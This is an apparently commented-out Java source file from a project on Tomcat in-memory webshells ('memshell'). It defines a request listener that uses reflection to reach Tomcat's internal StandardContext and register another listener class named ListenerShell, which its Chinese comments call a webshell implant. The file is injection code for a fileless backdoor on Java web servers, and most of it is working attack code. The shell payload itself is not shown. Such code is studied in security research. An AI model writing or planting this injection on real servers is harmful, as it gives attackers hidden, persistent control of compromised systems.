//package com.tomcatmemshell.listener;
//
//import org.apache.catalina.core.ApplicationContext;
//import org.apache.catalina.core.StandardContext;
//
//import javax.servlet.ServletContext;
//import javax.servlet.ServletRequestEvent;
//import javax.servlet.ServletRequestListener;
//import javax.servlet.annotation.WebListener;
//import java.lang.reflect.Field;
//
//@WebListener
//public class ListenerMemshell implements ServletRequestListener {
//    @Override
//    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
//
//    }
//
//    @Override
//    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
//        try {
//            // 先拿到 ServletContext
//            ServletContext servletContext = servletRequestEvent.getServletContext();
//            Field appctx = servletContext.getClass().getDeclaredField("context");
//            appctx.setAccessible(true);
//            // 从 ServletContext 里面拿到 ApplicationContext
//            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
//            Field atx = applicationContext.getClass().getDeclaredField("context");
//            atx.setAccessible(true);
//            // 从 ApplicationContext 里面拿到 StandardContext
//            StandardContext standardContext = (StandardContext) atx.get(applicationContext);
//
//            // 准备 listener 马
//            ListenerShell listenerShell = new ListenerShell();
//            // 添加到上下文
//            standardContext.addApplicationEventListener(listenerShell);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//}
